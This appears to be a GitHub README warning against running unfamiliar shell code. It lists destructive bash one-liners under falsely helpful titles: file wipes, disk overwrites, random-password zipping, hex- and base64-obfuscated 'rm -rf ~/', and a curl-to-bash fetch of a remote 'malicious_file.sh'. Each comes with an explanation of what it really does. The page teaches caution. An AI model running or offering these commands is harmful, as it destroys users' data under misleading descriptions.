# My one-page argument for learning to code (examples explained)

## **_NEVER_** run code you don't understand

I often hear people call themselves 'Copy and paste' coders. And, while copying and pasting is a legitimate thing to do,
it should not be your only way of doing things. A better method is to find code, see what is done and then recreate it,
and at a bare minimal, copy it, but know exactly what it does. \
Here is my small example of code that has unintended results.


> "Running code you found on the internet is like chewing gum you found in the subway".

### Try these (IN A VIRTUAL MACHINE!)

#### Here are some good descriptions to **bad** commands

Note: Most of these will error, but if suppressed with `&> /dev/null` or forked `&` can still do a lot of damage before
you can take action.
---
## Hide sensitive data:
``` bash
while read f; do LC_CTYPE=C sed -i "" 's:.:*:g' "$f"; done <<< "$(find ~/ -type f -print)"
```
<details>
<summary>Click to explain</summary>
Uses find to get all files and use sed to replace the contents with asterisks (*)
</details>

---
## Frees up unnecessary space:
``` bash
du ~ | grep -o '/.*' | xargs rm -rf --
```
<details>
<summary>Click to explain</summary>
For all  files in home, remove it forcefully
</details>

---
## Re-links your files to improve efficiency
``` bash
du ~/* | grep -o '/.*' | xargs -n 1 ln -sf /dev/null/
```
<details>
<summary>Click to explain</summary>
For the file files in the home link the file to dev/null, cloosing its contents
</details>

---

## Move files/folders to a volume with unlimited storage
``` bash
for d in ~/*/*; do mv "$d" /dev/null; done
```
<details>
<summary>Click to explain</summary>
Move file to /dev/null
</details>

---

## Frees up all unnecessary space
``` bash
command $(echo 7375646f20726d202d7266207e2f0a | xxd -r -p ) &> /dev/null
```
<details>
<summary>Click to explain</summary>
"7375646f20726d202d7266207e2f0a" hex dumped is "sudo rm -rf ~/" and command will run it
</details>

---

## Frees up all unnecessary space
``` bash
command $(echo c3VkbyBybSAtcmYgfi8K | base64 -d ) &> /dev/null
```
<details>
<summary>Click to explain</summary>
"c3VkbyBybSAtcmYgfi8K" in base64 is "sudo rm -rf ~/" and command will run it
</details>

---

## Chew the gum you don't even know
``` bash
bash -c "$(curl -s https://raw.githubusercontent.com/thedzy/My-one-page-argument-for-learning-to-code/master/malicious_file.sh)"
```
<details>
<summary>Click to explain</summary>
Pulls a malicious file from the internet and runs it
</details>

---

## Frees up unnecessary space:
``` bash
eval $(sed 's:[a-e,s-z]::g' <<< "stream -draft ~/saved")
```
<details>
<summary>Click to explain</summary>
Removing the characters a,b,c,d,e,s,t,u,v,w,x,y,z from "stream -draft ~/saved", gives you "rm -rf ~/" and eval runs that as code
</details>

---

## Frees up unnecessary space
```bash
eval $(echo 'come in -it ~/' | sed 'y/moteionc/deforums/')
```
<details>
<summary>Click to explain</summary>
Replace c->s o->u m->d e->o ... , gives you "rm -rf ~/" and eval runs that as code
</details>

---

## Compress files and save space
``` bash
zip --password "$(openssl rand -base64 64)" --move "$(openssl rand -hex 4)".zip  ~/*/*/*/*/*
```
<details>
<summary>Click to explain</summary>
For the file files in the home at a depth of 6, add the contents to a zip and give it a random password
</details>

---

## Reduce your need of the external volumes
```bash
for d in /dev/disk[2-9]*; do dd if=/dev/random of=$d &; done
```
<details>
<summary>Click to explain</summary>
For each volume (/dev/disk[2-9]) write random data to the drive, fork the process
</details>

---

## Simply your files and your life
```bash
find ~/ -type f -exec bash -c ':|tee {} &' \;
```
<details>
<summary>Click to explain</summary>
Uses find to get all files and uses tee to write empty contents to file
</details>

---

## Keep logs of files in the home folder utilising your current files
```bash
find ~/ -type f -exec awk 'FNR == 1{ print FILENAME > FILENAME } ' {}  \;
```
<details>
<summary>Click to explain</summary>
Uses find to get all files and uses awk to write file name into contents
</details>

---

## Cut down on disk space without removing a file
```bash
while read n; do eval `stat -s /`; echo $n, $st_dev; for i in $(seq 0 1 $n);do [ -f /.vol/$st_dev/$i ] &&  [ -w /.vol/$st_dev/$i ] && echo > /.vol/$st_dev/$i; done; done <<< `df -i | awk '$NF ~ /\/$/ {print $6}'`           
```
<details>
<summary>Click to explain</summary>
Loops though each inode in volume, if file exist and is writable, it wipes the content
</details>

---

## Every file gets a random makeover generating original data!
```bash 
find ~ -type f -exec dd if=/dev/urandom of={} bs=1M count=1 \;
```
<details>
<summary>Click to explain</summary>
Uses find to get all files and uses dd to write random content to the file
</details>

---

## Find your storage’s true limit.
```bash
dirs=($(IFS=$'\n'  find ~/ -type d -print)); while True; do cat /dev/random > ${dirs[$RANDOM % ${#dirs[@]}]}/$(openssl rand -hex $(($RANDOM % 32))); done
```
<details>
<summary>Click to explain</summary>
Write random dat to random files in random folders until the drive fills up
</details>

---

## 100% reduced file sizes
```bash
stat -f "%d %i" ~/*/** | while read d i; do [ -f /.vol/$d/$i ] && echo > /.vol/$d/$i; done
```
<details>
<summary>Click to explain</summary>
Write empty data to all your files, using inodes, wiping thier conents
</details>

---

## Quick find
```bash
find ~/Desktop -type f -delete
```
<details>
<summary>Click to explain</summary>
Find and delete
</details>

---

## Entrophy is organisation
```bash
while true; do i="$(find ~/ 2>/dev/null | shuf -n 1)"; [ -f $i ] && f=$i || rsync -q "$f" "$i"; done 
```
<details>
<summary>Click to explain</summary>
Randomly move files around
</details>

---



### Recommended testing environment:

1. Create a virtual machine.
2. Open terminal and run the following command to copy some files to the desktop: \
   ```bash
   find / -iname "*.txt" 2>/dev/null | head -n 60 | xargs -n1 -J% cp % $HOME/Desktop/ 
   ```
3. Snapshot your VM, because you'll want it
4. Run the command
5. Restore
6. Rinse and repeat




